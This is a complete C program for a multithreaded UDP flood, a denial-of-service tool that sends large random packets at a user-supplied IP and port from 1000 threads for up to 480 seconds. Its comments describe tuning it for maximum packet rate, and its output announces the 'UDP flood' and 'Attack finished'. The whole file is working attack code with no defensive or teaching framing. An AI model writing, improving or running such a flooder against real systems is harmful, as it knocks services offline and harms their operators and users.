#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>
#include <stdbool.h>

#define PAYLOAD_CHARS "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/"
#define PAYLOAD_SIZE 4096  // Increased from 1444 to 4096 (bigger packets)
#define THREAD_COUNT 1000  // Increased from 244 to 1000 (more threads)
#define MAX_DURATION_SECS 480

typedef struct {
    struct sockaddr_in target_addr;
    char *payload;
} thread_args;

pthread_mutex_t stop_mutex = PTHREAD_MUTEX_INITIALIZER;
bool stop_flag = false;

char *generate_payload() {
    char *payload = malloc(PAYLOAD_SIZE);
    if (!payload) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        int index = rand() % (sizeof(PAYLOAD_CHARS) - 1);
        payload[i] = PAYLOAD_CHARS[index];
    }

    return payload;
}

void *udp_worker(void *arg) {
    thread_args *args = (thread_args *)arg;
    struct sockaddr_in target_addr = args->target_addr;
    char *payload = args->payload;

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return NULL;
    }

    // Disable kernel buffering (optional, requires root)
    int buf_size = 0;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size)) < 0) {
        perror("setsockopt");
    }

    while (1) {
        pthread_mutex_lock(&stop_mutex);
        if (stop_flag) {
            pthread_mutex_unlock(&stop_mutex);
            break;
        }
        pthread_mutex_unlock(&stop_mutex);

        sendto(sockfd, payload, PAYLOAD_SIZE, 0, 
               (struct sockaddr *)&target_addr, sizeof(target_addr));
        // Removed usleep(1000) to maximize packet rate
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 3 || argc > 4) {
        fprintf(stderr, "Usage: %s <IP> <PORT> [DURATION=30]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = (argc == 4) ? atoi(argv[3]) : 30;

    if (port <= 0 || port > 65535) {
        fprintf(stderr, "Error: Invalid port number\n");
        exit(EXIT_FAILURE);
    }

    if (duration > MAX_DURATION_SECS) {
        fprintf(stderr, "Error: Duration cannot exceed %d seconds\n", MAX_DURATION_SECS);
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        perror("inet_pton");
        exit(EXIT_FAILURE);
    }

    srand(time(NULL));
    char *payload = generate_payload();

    thread_args args = {
        .target_addr = target_addr,
        .payload = payload
    };

    printf("Starting UDP flood on %s:%d for %d seconds\n", ip, port, duration);

    pthread_t threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, udp_worker, &args) != 0) {
            perror("pthread_create");
            exit(EXIT_FAILURE);
        }
    }

    sleep(duration);

    pthread_mutex_lock(&stop_mutex);
    stop_flag = true;
    pthread_mutex_unlock(&stop_mutex);

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    free(payload);
    printf("Attack finished\n");

    return 0;
}
